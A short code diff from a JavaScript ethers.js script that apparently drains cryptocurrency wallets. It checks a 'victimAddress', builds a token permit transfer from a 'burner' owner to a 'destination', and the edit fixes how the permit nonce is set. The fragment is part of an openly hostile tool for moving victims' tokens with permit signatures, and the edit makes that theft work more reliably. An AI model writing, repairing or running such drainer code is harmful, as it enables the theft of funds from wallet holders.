@@ -243,7 +243,7 @@ if (!tokenSymbol || !TOKENS[tokenSymbol] || !victimAddress || !ethers.utils.isAd
         permit.details.token,
         permit.details.amount,
         ethers.BigNumber.from(now + 86400), // expiration
-        ethers.BigNumber.from(nonce || 0)
+        permit.details.nonce
       ],
       burner.address,        // owner
       destination,           // recipient  
